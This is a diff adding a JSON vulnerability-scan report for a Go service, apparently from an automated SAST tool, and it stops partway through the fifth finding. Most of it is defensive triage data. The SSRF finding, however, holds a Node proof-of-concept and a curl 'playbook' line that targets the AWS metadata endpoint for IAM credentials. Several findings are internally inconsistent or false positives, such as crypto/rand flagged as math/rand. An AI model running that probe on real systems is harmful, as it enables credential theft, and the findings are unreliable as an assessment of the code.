@@ -1,0 +1,3335 @@
+{
+  "scanId": "2843f91a-fdab-4d89-bff4-fc582d8e8bf9",
+  "startedAt": "2026-06-02T18:47:15.188Z",
+  "durationMs": 228,
+  "scanned": {
+    "files": 43,
+    "lines": 0
+  },
+  "findings": [
+    {
+      "id": "weak-rng:internal/pki/issue.go:42",
+      "kind": "sast",
+      "severity": "high",
+      "vuln": "Insecure Randomness — math/rand (non-crypto) used for security-sensitive value",
+      "cwe": "CWE-338",
+      "owaspLlm": null,
+      "stride": null,
+      "file": "internal/pki/issue.go",
+      "line": 42,
+      "snippet": "serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.8,
+      "corroborationCount": 1,
+      "corroboration": {
+        "count": 1,
+        "by": [
+          "WEAK-RNG"
+        ]
+      },
+      "multiSignal": null,
+      "proof": {
+        "verdict": "unproven",
+        "reasons": [
+          "no flow-proof applicable to this finding class"
+        ]
+      },
+      "provablySafe": null,
+      "toxicity": 15,
+      "toxicityFactors": [
+        "high-severity"
+      ],
+      "toxicityLabel": "Low",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "admin-only",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 19250,
+        "dollarLikely": 111250,
+        "dollarWorst": 650000,
+        "dollarLow": 19250,
+        "dollarHigh": 650000,
+        "components": {
+          "incidentResponse": {
+            "low": 4000,
+            "likely": 25000,
+            "high": 125000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "Insecure Randomness — math/rand (non-crypto) used for security-sensitive value on `internal/pki/issue.go:42` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $19k · likely $111k · worst $650k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": "9ad50f78e47e8632",
+      "confidenceTier": "high",
+      "exploitability": 0.45,
+      "exploitabilityTier": "medium",
+      "exploitabilityFactors": [
+        "sev:high",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "weak-rng",
+      "parser": "WEAK-RNG",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 15,
+      "calibration_reason": "insufficient-samples",
+      "verifier_verdict": "unverified-by-design",
+      "verifier_reason": "family-no-poc:weak-rng",
+      "verifier_runner": null,
+      "narration": "A finding of type \"Insecure Randomness — math/rand (non-crypto) used for security-sensitive value\" at internal/pki/issue.go:42. Severity: high. Review the remediation field for class-specific guidance.",
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.25,
+      "crownJewelTier": "standard",
+      "crownJewelFactors": [
+        "crypto-keys"
+      ],
+      "cloneClusterId": "b8a488d70ad725da",
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "script-kiddie",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "script-kiddie",
+      "personaMaxScore": 0.65,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/weak-rng",
+        "ruleId": "CWE-338",
+        "parser": "WEAK-RNG",
+        "evidence": {
+          "sinkSnippet": "serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))",
+          "sourceSnippet": null,
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "standard",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "go-newrequest-user-url:internal/agent/sync/client.go:43",
+      "kind": "sast",
+      "severity": "high",
+      "vuln": "SSRF — http.NewRequest with variable URL",
+      "cwe": "CWE-918",
+      "owaspLlm": null,
+      "stride": "Spoofing",
+      "file": "internal/agent/sync/client.go",
+      "line": 43,
+      "snippet": "httpReq, err := http.NewRequest(http.MethodPost, c.BaseURL+\"/v1/sync\", bytes.NewReader(body))",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.85,
+      "corroborationCount": 1,
+      "corroboration": {
+        "count": 1,
+        "by": [
+          "GO"
+        ]
+      },
+      "multiSignal": null,
+      "proof": {
+        "verdict": "unproven",
+        "reasons": [
+          "no flow-proof applicable to this finding class"
+        ]
+      },
+      "provablySafe": null,
+      "toxicity": 15,
+      "toxicityFactors": [
+        "high-severity"
+      ],
+      "toxicityLabel": "Low",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "admin-only",
+        "dataAtRisk": [
+          "credentials"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 20000,
+        "dollarLikely": 113000,
+        "dollarWorst": 652500,
+        "dollarLow": 20000,
+        "dollarHigh": 652500,
+        "components": {
+          "incidentResponse": {
+            "low": 4000,
+            "likely": 25000,
+            "high": 125000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 1000,
+            "likely": 3000,
+            "high": 12500
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)",
+        "confidence": "low",
+        "narrative": "SSRF — http.NewRequest with variable URL on `internal/agent/sync/client.go:43` could expose production credentials and API keys. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $20k · likely $113k · worst $653k. Dominant driver: legal counsel. Comparable: Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)."
+      },
+      "stableId": "b1acad26109f0b5f",
+      "confidenceTier": "high",
+      "exploitability": 0.45,
+      "exploitabilityTier": "medium",
+      "exploitabilityFactors": [
+        "sev:high",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "ssrf",
+      "parser": "GO",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": {
+        "lang": "node",
+        "framework": null,
+        "filename": null,
+        "runHint": null,
+        "code": null
+      },
+      "poc": {
+        "lang": "node",
+        "kind": "http-payload",
+        "cwe": "CWE-918",
+        "family": "ssrf",
+        "runHint": "node poc.mjs",
+        "code": "// Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.\n// Endpoint:   POST http://localhost:3000/REPLACE-WITH-ENDPOINT\n// Payload:    http://127.0.0.1:65533/poc-ssrf-sentinel\n// Expect:     sentinel server logs a request from the target — proves the target made an outbound call we controlled\n// Run:        node poc.mjs\n// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error\n\nconst URL_ = \"http://localhost:3000/REPLACE-WITH-ENDPOINT\";\nconst METHOD = \"POST\";\nconst PAYLOAD = `http://127.0.0.1:65533/poc-ssrf-sentinel`;\n\nconst body = METHOD === 'GET'\n  ? null\n  : JSON.stringify({ \"input\": PAYLOAD });\n\nconst headers = { 'Content-Type': 'application/json' };\n\nconst reqUrl = METHOD === 'GET'\n  ? URL_ + (URL_.includes('?') ? '&' : '?') + \"input\" + '=' + encodeURIComponent(PAYLOAD)\n  : URL_;\n\ntry {\n  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });\n  const text = await r.text();\n  const sig = (text.includes(\"http://127.0.0.1:65533/poc-ssrf-sentinel\") ? 'payload reflected' : '');\n  if (sig) {\n    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\\n');\n    process.exit(0);\n  }\n  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\\n');\n  process.exit(1);\n} catch (e) {\n  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');\n  process.exit(2);\n}\n",
+        "paramKey": null,
+        "paramKeyConfidence": "low",
+        "paramKeyInferred": false
+      },
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 24,
+      "calibration_reason": "insufficient-samples",
+      "verifier_verdict": "verified-sanitizer-absence",
+      "verifier_reason": "no-sanitizer-in-window",
+      "verifier_runner": null,
+      "narration": "The handler fetches a URL constructed from user input. An attacker supplies a URL pointing at cloud-metadata endpoints (169.254.169.254 on AWS, metadata.google.internal on GCP) or internal services not exposed externally. Typical impact: theft of IAM credentials attached to the instance, fingerprinting / exploitation of internal services, port-scanning the VPC. Cost: full AWS account compromise in the worst case (IAM credential rotation, audit, blast-radius review of every action taken under the leaked credentials).",
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0,
+      "crownJewelTier": "unknown",
+      "crownJewelFactors": [],
+      "cloneClusterId": "9ace5aaf2c011be0",
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": "tampering",
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.85,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.20"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.95,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.30"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "apt-nation-state",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "apt-nation-state",
+      "personaMaxScore": 0.95,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/ssrf",
+        "ruleId": "CWE-918",
+        "parser": "GO",
+        "evidence": {
+          "sinkSnippet": "httpReq, err := http.NewRequest(http.MethodPost, c.BaseURL+\"/v1/sync\", bytes.NewReader(body))",
+          "sourceSnippet": null,
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "unknown",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": {
+        "low": 100,
+        "likely": 400,
+        "high": 1200,
+        "program": "web2"
+      },
+      "bountyConfidence": "high",
+      "attackPlaybook": {
+        "cwe": "CWE-918",
+        "kind": "curl",
+        "title": "SSRF — cloud metadata probe",
+        "instruction": "Direct the URL parameter at AWS IMDS; if it returns instance data, SSRF is confirmed.",
+        "script": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test.\n# CWE-918 — SSRF\ncurl -s -i \"${TARGET_URL}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# Confirmed when body contains 'AccessKeyId' or 'iam'.",
+        "ethics": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test."
+      }
+    },
+    {
+      "id": "pqc-rsa-keygen:internal/pki/issue.go:37",
+      "kind": "sast",
+      "severity": "medium",
+      "vuln": "Pre-quantum RSA (rsa-sign) — replace with ML-DSA-65 before CRQC arrives",
+      "cwe": "CWE-327",
+      "owaspLlm": null,
+      "stride": "Information Disclosure",
+      "file": "internal/pki/issue.go",
+      "line": 37,
+      "snippet": "key, err := rsa.GenerateKey(rand.Reader, 2048)",
+      "fix": null,
+      "reachable": false,
+      "triage": 22,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.85,
+      "corroborationCount": 1,
+      "corroboration": {
+        "count": 1,
+        "by": [
+          "PQC"
+        ]
+      },
+      "multiSignal": null,
+      "proof": {
+        "verdict": "unproven",
+        "reasons": [
+          "no flow-proof applicable to this finding class"
+        ]
+      },
+      "provablySafe": null,
+      "toxicity": 8,
+      "toxicityFactors": [],
+      "toxicityLabel": "Low",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "admin-only",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 19250,
+        "dollarLikely": 111250,
+        "dollarWorst": 650000,
+        "dollarLow": 19250,
+        "dollarHigh": 650000,
+        "components": {
+          "incidentResponse": {
+            "low": 4000,
+            "likely": 25000,
+            "high": 125000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Adobe 2013 weak ECB encryption → 38M user passwords reverse-engineered",
+        "confidence": "low",
+        "narrative": "Pre-quantum RSA (rsa-sign) — replace with ML-DSA-65 before CRQC arrives on `internal/pki/issue.go:37` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $19k · likely $111k · worst $650k. Dominant driver: legal counsel. Comparable: Adobe 2013 weak ECB encryption → 38M user passwords reverse-engineered."
+      },
+      "stableId": "2bc4e0f264900129",
+      "confidenceTier": "high",
+      "exploitability": 0.2,
+      "exploitabilityTier": "low",
+      "exploitabilityFactors": [
+        "sev:medium",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "pqc-migration",
+      "parser": "PQC",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": "no-history",
+      "verifier_verdict": "cannot-verify",
+      "verifier_reason": "no-poc-no-sanitizer-rule",
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.25,
+      "crownJewelTier": "standard",
+      "crownJewelFactors": [
+        "crypto-keys"
+      ],
+      "cloneClusterId": "a9a0788c69932dfc",
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "script-kiddie",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "script-kiddie",
+      "personaMaxScore": 0.4,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/pqc-migration",
+        "ruleId": "CWE-327",
+        "parser": "PQC",
+        "evidence": {
+          "sinkSnippet": "key, err := rsa.GenerateKey(rand.Reader, 2048)",
+          "sourceSnippet": null,
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "standard",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "pqc-rsa-sign:internal/pki/issue.go:6",
+      "kind": "sast",
+      "severity": "medium",
+      "vuln": "Pre-quantum RSA (rsa-sign) — replace with ML-DSA-65 before CRQC arrives",
+      "cwe": "CWE-327",
+      "owaspLlm": null,
+      "stride": "Information Disclosure",
+      "file": "internal/pki/issue.go",
+      "line": 6,
+      "snippet": "\"crypto/rsa\"",
+      "fix": null,
+      "reachable": false,
+      "triage": 22,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.85,
+      "corroborationCount": 1,
+      "corroboration": {
+        "count": 1,
+        "by": [
+          "PQC"
+        ]
+      },
+      "multiSignal": null,
+      "proof": {
+        "verdict": "unproven",
+        "reasons": [
+          "no flow-proof applicable to this finding class"
+        ]
+      },
+      "provablySafe": null,
+      "toxicity": 8,
+      "toxicityFactors": [],
+      "toxicityLabel": "Low",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "admin-only",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 19250,
+        "dollarLikely": 111250,
+        "dollarWorst": 650000,
+        "dollarLow": 19250,
+        "dollarHigh": 650000,
+        "components": {
+          "incidentResponse": {
+            "low": 4000,
+            "likely": 25000,
+            "high": 125000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Adobe 2013 weak ECB encryption → 38M user passwords reverse-engineered",
+        "confidence": "low",
+        "narrative": "Pre-quantum RSA (rsa-sign) — replace with ML-DSA-65 before CRQC arrives on `internal/pki/issue.go:6` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $19k · likely $111k · worst $650k. Dominant driver: legal counsel. Comparable: Adobe 2013 weak ECB encryption → 38M user passwords reverse-engineered."
+      },
+      "stableId": "c6f47a5ef16d8556",
+      "confidenceTier": "high",
+      "exploitability": 0.2,
+      "exploitabilityTier": "low",
+      "exploitabilityFactors": [
+        "sev:medium",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "pqc-migration",
+      "parser": "PQC",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": "no-history",
+      "verifier_verdict": "cannot-verify",
+      "verifier_reason": "no-poc-no-sanitizer-rule",
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.25,
+      "crownJewelTier": "standard",
+      "crownJewelFactors": [
+        "crypto-keys"
+      ],
+      "cloneClusterId": null,
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "script-kiddie",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "script-kiddie",
+      "personaMaxScore": 0.4,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/pqc-migration",
+        "ruleId": "CWE-327",
+        "parser": "PQC",
+        "evidence": {
+          "sinkSnippet": "\"crypto/rsa\"",
+          "sourceSnippet": null,
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "standard",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "timing-unsafe:internal/server/server.go:88",
+      "kind": "sast",
+      "severity": "medium",
+      "vuln": "Timing-Unsafe Comparison — secret/HMAC compared with === instead of timingSafeEqual",
+      "cwe": "CWE-208",
+      "owaspLlm": null,
+      "stride": null,
+      "file": "internal/server/server.go",
+      "line": 88,
+      "snippet": "if req.LastDigest == digest {",
+      "fix": null,
+      "reachable": false,
+      "triage": 22,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.7,
+      "corroborationCount": 1,
+      "corroboration": {
+        "count": 1,
+        "by": [
+          "COMPARISON"
+        ]
+      },
+      "multiSignal": null,
+      "proof": {
+        "verdict": "unproven",
+        "reasons": [
+          "no flow-proof applicable to this finding class"
+        ]
+      },
+      "provablySafe": null,
+      "toxicity": 8,
+      "toxicityFactors": [],
+      "toxicityLabel": "Low",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "admin-only",
+        "dataAtRisk": [
+          "credentials"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 20000,
+        "dollarLikely": 113000,
+        "dollarWorst": 652500,
+        "dollarLow": 20000,
+        "dollarHigh": 652500,
+        "components": {
+          "incidentResponse": {
+            "low": 4000,
+            "likely": 25000,
+            "high": 125000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 1000,
+            "likely": 3000,
+            "high": 12500
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "Timing-Unsafe Comparison — secret/HMAC compared with === instead of timingSafeEqual on `internal/server/server.go:88` could expose production credentials and API keys. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $20k · likely $113k · worst $653k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": "2bf94e430c38a031",
+      "confidenceTier": "medium",
+      "exploitability": 0.2,
+      "exploitabilityTier": "low",
+      "exploitabilityFactors": [
+        "sev:medium",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "timing-attack",
+      "parser": "COMPARISON",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
